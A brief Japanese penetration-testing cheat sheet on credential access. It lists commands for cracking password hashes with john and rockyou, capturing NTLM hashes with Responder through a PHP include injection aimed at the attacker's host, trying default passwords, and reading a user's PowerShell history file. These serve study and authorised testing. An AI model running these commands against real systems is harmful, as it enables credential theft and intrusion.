# 資格情報アクセス

## アプリケーションに含まれる情報
・.jarの情報はJD-GUIで見れる
    ・Spring Bootを使用していればapplication.propertiesで見れる


## パスワードハッシュ解析
DB等から取得したパスワードハッシュを復元することで、パスワードを使いまわしている場合に別システムに侵入できる

Hash Identinierでハッシュ値の形式を特定できる

```
hash-identifier
```

johnでパスワード解析できる
```
john --format=raw-sha512 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt 
```
Kali Linuxであれば/user/share/wordlistsにrockyouの圧縮されたファイルがある。
formatで指定できる形式は以下を参照
https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats

パスワード解析にはWebから使用できるCrackStationも便利
https://crackstation.net/

## NTLMハッシュの取得

### Responder
```
responder -I tun0
```
Responderを使用することで様々な通信を受けることができる

### 攻撃対象からResponderへの通信を発生させる
responderを起動した後、攻撃対象のWebアプリケーション等に対して外部のファイルを取得するように動かす
```
例：PHPでinclude(//<受けのIPアドレス>/somefile)を実行されるようCodeInjectionを行うなど
```
取得できたハッシュをjohnなどで解析する

## デフォルトパスワードの使用
サービスごとのデフォルトパスワードでログインできないか試行する。

https://cirt.net/passwords

## Powershellの履歴取得
以下の場所からPowerShellのコマンド実行履歴を取得できる

```
type C:\Users\<ユーザ>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt 
```